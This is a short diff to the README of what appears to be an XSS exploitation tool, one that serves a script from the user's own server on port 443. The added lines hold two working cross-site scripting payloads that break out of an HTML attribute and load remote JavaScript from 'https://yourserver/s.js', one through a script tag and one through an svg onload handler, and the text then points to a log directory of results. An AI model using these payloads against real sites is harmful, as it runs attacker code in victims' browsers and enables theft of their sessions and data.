@@ -16,7 +16,11 @@ sudo python3 server.py 443
 
 * load this script with an xss:
 ```html
-<script/src="https://yourserver/a.js"></script>
+'"><script/src=https://yourserver/s.js></script>
+```
+* alternatively:
+```html
+'"><svg/onload=body.appendChild(document.createElement`script`).src="https://yourserver/s.js">
 ```
 
 * see the files in the log directory
